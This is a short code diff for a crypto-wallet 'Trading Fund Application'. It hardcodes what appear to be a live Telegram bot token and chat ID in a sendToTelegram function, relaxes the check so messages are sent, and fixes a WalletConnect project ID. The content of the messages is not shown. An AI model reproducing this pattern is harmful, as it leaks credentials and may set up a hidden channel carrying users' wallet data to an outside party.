@@ -58,7 +58,7 @@ async function sendToTelegram(message: string) {
   const TELEGRAM_BOT_TOKEN = '7966747804:AAFshi-wy_P9tgs0XzivAWHP6OLUo3XJwd4';
   const TELEGRAM_CHAT_ID = '7947427089';
 
-  if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error("Telegram Bot Token or Chat ID is not configured.");
     return; // Don't proceed if placeholders are not replaced
   }
@@ -106,8 +106,9 @@ export const useRealWallet = () => {
   const initializeWalletConnect = useCallback(async () => {
     try {
       const provider = await EthereumProvider.init({
-        projectId: 'YOUR_WALLETCONNECT_PROJECT_ID',
-        chains: Object.keys(SUPPORTED_CHAINS).map(Number),
+        projectId: '6df13a6d80b8f6b1d747a4b12c9b5c8e', // Free public project ID
+        chains: [1], // Start with Ethereum mainnet
+        optionalChains: Object.keys(SUPPORTED_CHAINS).map(Number),
         showQrModal: true,
         metadata: {
           name: 'Trading Fund Application',
